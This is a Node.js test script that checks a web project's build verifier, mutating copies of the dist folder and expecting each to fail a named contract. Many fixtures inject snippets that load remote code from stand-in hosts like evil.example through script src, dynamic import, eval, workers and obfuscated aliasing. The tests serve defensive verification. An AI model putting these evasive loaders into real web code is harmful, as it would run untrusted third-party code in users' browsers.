import { createHash } from 'node:crypto';
import { cp, mkdir, mkdtemp, readFile, readdir, rename, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const repositoryRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const verifierPath = path.join(repositoryRoot, 'scripts', 'verify_dist.mjs');
const realDist = path.join(repositoryRoot, 'dist');

const fail = (detail) => {
  throw new Error(`[VERIFY_DIST_TEST] ${detail}`);
};

const runVerifier = (root) => spawnSync(process.execPath, [verifierPath, root], {
  cwd: repositoryRoot,
  encoding: 'utf8',
});

const emittedText = (result) => `${result.stdout ?? ''}\n${result.stderr ?? ''}`;

const expectPass = (name, root) => {
  const result = runVerifier(root);
  if (result.status !== 0 || !emittedText(result).includes('VERIFY_DIST_PASS')) {
    fail(`${name} should pass but exited ${result.status}: ${emittedText(result)}`);
  }
  console.log(`FIXTURE_PASS name=${name} expected=VERIFY_DIST_PASS`);
};

const expectFailure = (name, root, contract) => {
  const result = runVerifier(root);
  if (result.status === 0) fail(`${name} unexpectedly passed`);
  if (!emittedText(result).includes(`[${contract}]`)) {
    fail(`${name} failed for the wrong reason; expected [${contract}]: ${emittedText(result)}`);
  }
  console.log(`FIXTURE_PASS name=${name} expected=${contract}`);
};

// The build inlines the stylesheet, so a fixture has one JS asset and no CSS
// file. cssPath still resolves to a plausible fingerprinted name so fixtures
// can write one out to prove the contract rejects it.
const findAssets = async (root) => {
  const entries = await readdir(path.join(root, 'assets'));
  const js = entries.find((entry) => /^index-.+\.js$/.test(entry));
  if (!js) fail(`fixture is missing its JS asset: ${root}`);
  const css = `index-${js.replace(/^index-/, '').replace(/\.js$/, '')}.css`;
  return {
    htmlPath: path.join(root, 'index.html'),
    jsPath: path.join(root, 'assets', js),
    cssPath: path.join(root, 'assets', css),
    js,
    css,
  };
};

const replaceHtml = async (root, transform) => {
  const htmlPath = path.join(root, 'index.html');
  const original = await readFile(htmlPath, 'utf8');
  const updated = transform(original);
  if (updated === original) fail(`HTML mutation did not change fixture: ${root}`);
  await writeFile(htmlPath, updated, 'utf8');
};

const appendJavaScript = async (root, payload) => {
  const { jsPath } = await findAssets(root);
  await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\n${payload}\n`, 'utf8');
};

const deterministicNoise = (minimumLength) => {
  let output = '';
  for (let index = 0; output.length < minimumLength; index += 1) {
    output += createHash('sha256').update(`studiozio-budget-fixture-${index}`).digest('hex');
  }
  return output;
};

const run = async () => {
  expectPass('real_dist', realDist);

  const tempRoot = await mkdtemp(path.join(tmpdir(), 'studiozio-verify-dist-'));
  const fixtures = [
    {
      name: 'meaningless_underscore_fingerprint',
      contract: 'FINGERPRINT_CONTRACT',
      mutate: async (root) => {
        const assets = await findAssets(root);
        const replacement = 'index-________.js';
        await rename(assets.jsPath, path.join(root, 'assets', replacement));
        await replaceHtml(root, (html) => html.replace(assets.js, replacement));
      },
    },
    {
      name: 'single_custom_gtag_event',
      contract: 'GA4_EXACTNESS',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\ngtag('event', 'probe');\n`, 'utf8');
      },
    },
    {
      name: 'double_custom_gtag_event',
      contract: 'GA4_EXACTNESS',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\ngtag("event", "one");gtag('event', 'two');\n`, 'utf8');
      },
    },
    {
      name: 'additional_ga_measurement_id',
      contract: 'GA4_EXACTNESS',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\nconst extraMeasurement='G-1ABCDE2345';\n`, 'utf8');
      },
    },
    {
      name: 'google_ads_id',
      contract: 'GA4_EXACTNESS',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\nconst adsIdentity='AW-123456789';\n`, 'utf8');
      },
    },
    {
      name: 'dynamic_script_creation',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\ndocument.createElement('script');\n`, 'utf8');
      },
    },
    {
      name: 'dynamic_script_src',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\nconst injectedScript={};injectedScript.src='https://evil.invalid/runtime.js';\n`, 'utf8');
      },
    },
    {
      name: 'dynamic_script_src_attribute',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\nconst injectedScript={setAttribute(){}};injectedScript.setAttribute('src','https://evil.invalid/runtime.js');\n`, 'utf8');
      },
    },
    {
      name: 'remote_dynamic_import',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `${await readFile(jsPath, 'utf8')}\nimport('https://evil.invalid/runtime.js');\n`, 'utf8');
      },
    },
    {
      name: 'computed_single_quote_script_loader',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioComputedSingle=document['createElement']('script');zioComputedSingle['src']='https://evil.example/x.js';",
      ),
    },
    {
      name: 'computed_double_quote_script_loader',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        'const zioComputedDouble=document["createElement"]("script");zioComputedDouble["src"]="https://evil.example/x.js";',
      ),
    },
    {
      name: 'create_element_alias_assignment',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "let zioAssignedCreate;zioAssignedCreate=document.createElement;zioAssignedCreate('script');",
      ),
    },
    {
      name: 'computed_create_element_property_alias',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioCreateProperty='createElement';document[zioCreateProperty]('script');",
      ),
    },
    {
      name: 'ambiguous_create_element_tag',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        'const zioAmbiguousTag=globalThis.location.hash.slice(1);document.createElement(zioAmbiguousTag);',
      ),
    },
    {
      name: 'create_element_alias_destructuring',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const {createElement:zioDestructuredCreate}=document;zioDestructuredCreate('script');",
      ),
    },
    {
      name: 'create_element_computed_destructuring',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const {['create'+'Element']:zioComputedDestructuredCreate}=document;zioComputedDestructuredCreate('script');",
      ),
    },
    {
      name: 'create_element_bind_object_assign',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioBoundCreate=document.createElement.bind(document);const zioBoundScript=zioBoundCreate('script');Object.assign(zioBoundScript,{src:'https://evil.example/x.js'});",
      ),
    },
    {
      name: 'create_element_call',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "document.createElement.call(document,'script');"),
    },
    {
      name: 'create_element_apply',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "document['createElement'].apply(document,['script']);"),
    },
    {
      name: 'object_assign_remote_src',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioAssignTarget={};Object.assign(zioAssignTarget,{src:'https://evil.example/x.js'});",
      ),
    },
    {
      name: 'computed_remote_src_assignment',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioComputedTarget={};zioComputedTarget['src']='https://evil.example/x.js';",
      ),
    },
    {
      name: 'set_attribute_variable_remote_src',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioAttributeRemote='https://evil.example/x.js';const zioAttributeTarget={setAttribute(){}};zioAttributeTarget.setAttribute('src',zioAttributeRemote);",
      ),
    },
    {
      name: 'object_define_property_remote_src',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioDefinedTarget={};Object.defineProperty(zioDefinedTarget,'src',{value:'https://evil.example/x.js'});",
      ),
    },
    {
      name: 'object_define_properties_remote_src',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioDefinedTargets={};Object.defineProperties(zioDefinedTargets,{src:{value:'https://evil.example/x.js'}});",
      ),
    },
    {
      name: 'reflect_set_remote_src',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioReflectedTarget={};Reflect.set(zioReflectedTarget,'src','https://evil.example/x.js');",
      ),
    },
    {
      name: 'variable_remote_dynamic_import',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioRemoteModule='https://evil.example/mod.js';import(zioRemoteModule);",
      ),
    },
    {
      name: 'template_expression_dynamic_import',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioModuleHost='evil.example';import(`https://${zioModuleHost}/mod.js`);",
      ),
    },
    {
      name: 'data_url_dynamic_import',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "import('data:text/javascript,export default 1');"),
    },
    {
      name: 'protocol_relative_dynamic_import',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "import('//evil.example/mod.js');"),
    },
    {
      name: 'bare_package_dynamic_import',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "import('unverified-package');"),
    },
    {
      name: 'absolute_path_dynamic_import',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "import('/assets/unverified.js');"),
    },
    {
      name: 'eval_code_loading',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "eval('import(\\\"https://evil.example/mod.js\\\")');"),
    },
    {
      name: 'window_eval_code_loading',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "window['eval']('import(\\\"https://evil.example/mod.js\\\")');"),
    },
    {
      name: 'function_constructor_non_static_source',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        'const zioFunctionSource=globalThis.location.hash;new Function(zioFunctionSource);',
      ),
    },
    {
      name: 'worker_remote_url',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "new Worker('https://evil.example/worker.js');"),
    },
    {
      name: 'shared_worker_variable_remote_url',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(
        root,
        "const zioSharedWorkerUrl='https://evil.example/shared.js';new SharedWorker(zioSharedWorkerUrl);",
      ),
    },
    {
      name: 'import_scripts_protocol_relative_url',
      contract: 'DYNAMIC_EXTERNAL_SCRIPT',
      mutate: (root) => appendJavaScript(root, "importScripts('//evil.example/imported.js');"),
    },
    { name: 'var_create_element_hoist', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "if(true){var c=document.createElement}c('script');") },
    { name: 'destructuring_assignment_create_element', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "let c;({createElement:c}=document);c('script');") },
    { name: 'object_assign_alias', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "const a=Object.assign;a({}, {src:'https://evil.invalid/x.js'});") },
    { name: 'reflect_set_alias', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "const r=Reflect.set;r({},'src','https://evil.invalid/x.js');") },
    { name: 'set_attribute_call', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "const n={setAttribute(){}};n.setAttribute.call(n,'src','https://evil.invalid/x.js');") },
    { name: 'object_assign_call', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "Object.assign.call(Object,{}, {src:'https://evil.invalid/x.js'});") },
    { name: 'eval_call', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "eval.call(globalThis,'alert(1)');") },
    { name: 'reflect_apply_create_element', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "Reflect.apply(document.createElement,document,['script']);") },
    { name: 'function_call_code_loading', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "Function('import(\"https://evil.invalid/x.js\")')();") },
    { name: 'reassigned_remote_src', contract: 'DYNAMIC_EXTERNAL_SCRIPT', mutate: (root) => appendJavaScript(root, "let u='./safe.js';u='https://evil.invalid/x.js';const n={};n.src=u;") },
    {
      name: 'symlinked_asset',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await rm(jsPath);
        await symlink(path.join(realDist, 'index.html'), jsPath);
      },
    },
    {
      name: 'traversal_reference',
      contract: 'HTML_ASSET_RESOLUTION',
      mutate: async (root) => {
        const { js } = await findAssets(root);
        await replaceHtml(root, (html) => html.replace(`/assets/${js}`, `/../assets/${js}`));
      },
    },
    {
      name: 'missing_referenced_asset',
      contract: 'HTML_ASSET_RESOLUTION',
      mutate: async (root) => {
        const { js } = await findAssets(root);
        await replaceHtml(root, (html) => html.replace(js, 'index-Abc12345.js'));
      },
    },
    {
      name: 'unreferenced_asset',
      contract: 'STRUCTURAL_OUTPUT',
      mutate: async (root) => {
        await writeFile(path.join(root, 'assets', 'index-Abc12345.js'), 'export default 1;\n', 'utf8');
      },
    },
    {
      name: 'source_map',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await writeFile(path.join(root, 'assets', 'index-Abc12345.js.map'), '{}\n', 'utf8');
      },
    },
    {
      name: 'unexpected_json',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await writeFile(path.join(root, 'metadata.json'), '{}\n', 'utf8');
      },
    },
    {
      name: 'unexpected_config',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await writeFile(path.join(root, 'vercel.json'), '{}\n', 'utf8');
      },
    },
    {
      name: 'unexpected_source',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await writeFile(path.join(root, 'assets', 'source.ts'), 'export {};\n', 'utf8');
      },
    },
    {
      name: 'executable_at_output_root',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await writeFile(path.join(root, 'payload.js'), 'export default 1;\n', 'utf8');
      },
    },
    {
      name: 'robots_name_reused_in_subdirectory',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await mkdir(path.join(root, 'assets'), { recursive: true });
        await writeFile(path.join(root, 'assets', 'robots.txt'), 'User-agent: *\n', 'utf8');
      },
    },
    {
      name: 'executable_in_font_directory',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await mkdir(path.join(root, 'assets', 'fonts'), { recursive: true });
        await writeFile(path.join(root, 'assets', 'fonts', 'payload.js'), 'export default 1;\n', 'utf8');
      },
    },
    {
      name: 'font_payload_is_not_woff2',
      contract: 'OUTPUT_ALLOWLIST',
      mutate: async (root) => {
        await mkdir(path.join(root, 'assets', 'fonts'), { recursive: true });
        await writeFile(path.join(root, 'assets', 'fonts', 'imposter.woff2'), 'not a font\n', 'utf8');
      },
    },
    {
      name: 'javascript_gzip_budget',
      contract: 'GZIP_BUDGET',
      mutate: async (root) => {
        const { jsPath } = await findAssets(root);
        await writeFile(jsPath, `export default '${deterministicNoise(450_000)}';\n`, 'utf8');
      },
    },
    {
      name: 'css_gzip_budget',
      contract: 'GZIP_BUDGET',
      mutate: async (root) => {
        await replaceHtml(root, (html) =>
          html.replace('</style>', `.fixture{--noise:'${deterministicNoise(150_000)}'}</style>`));
      },
    },
    {
      name: 'stylesheet_left_as_a_separate_file',
      contract: 'STRUCTURAL_OUTPUT',
      mutate: async (root) => {
        const { cssPath } = await findAssets(root);
        await writeFile(cssPath, '.fixture{color:red}\n', 'utf8');
      },
    },
    {
      name: 'external_stylesheet_link_reintroduced',
      contract: 'THIRD_PARTY_SCRIPT_POLICY',
      mutate: async (root) => {
        await replaceHtml(root, (html) =>
          html.replace('</head>', '<link rel="stylesheet" href="https://cdn.example.com/x.css"></head>'));
      },
    },
    {
      name: 'second_inline_stylesheet',
      contract: 'STRUCTURAL_OUTPUT',
      mutate: async (root) => {
        await replaceHtml(root, (html) => html.replace('</head>', '<style>.x{color:red}</style></head>'));
      },
    },
    {
      name: 'inline_stylesheet_imports_offsite',
      contract: 'THIRD_PARTY_SCRIPT_POLICY',
      mutate: async (root) => {
        await replaceHtml(root, (html) =>
          html.replace('<style>', '<style>@import url("https://cdn.example.com/x.css");'));
      },
    },
    {
      name: 'inline_stylesheet_fetches_offsite_url',
      contract: 'THIRD_PARTY_SCRIPT_POLICY',
      mutate: async (root) => {
        await replaceHtml(root, (html) =>
          html.replace('</style>', '.x{background:url(https://cdn.example.com/x.png)}</style>'));
      },
    },
  ];

  try {
    const localImportRoot = path.join(tempRoot, 'local_dynamic_import');
    await mkdir(localImportRoot, { recursive: true });
    await cp(realDist, localImportRoot, { recursive: true, dereference: false, verbatimSymlinks: true });
    const localImportAssets = await findAssets(localImportRoot);
    await appendJavaScript(localImportRoot, `import('./${localImportAssets.js}');`);
    expectPass('local_dynamic_import', localImportRoot);

    for (const fixture of fixtures) {
      const fixtureRoot = path.join(tempRoot, fixture.name);
      await mkdir(fixtureRoot, { recursive: true });
      await cp(realDist, fixtureRoot, { recursive: true, dereference: false, verbatimSymlinks: true });
      await fixture.mutate(fixtureRoot);
      expectFailure(fixture.name, fixtureRoot, fixture.contract);
    }
  } finally {
    await rm(tempRoot, { recursive: true, force: true });
  }

  console.log(`VERIFY_DIST_TEST_PASS positive=2 negative=${fixtures.length}`);
};

run().catch((error) => {
  console.error(`VERIFY_DIST_TEST_FAIL ${error instanceof Error ? error.message : String(error)}`);
  process.exitCode = 1;
});
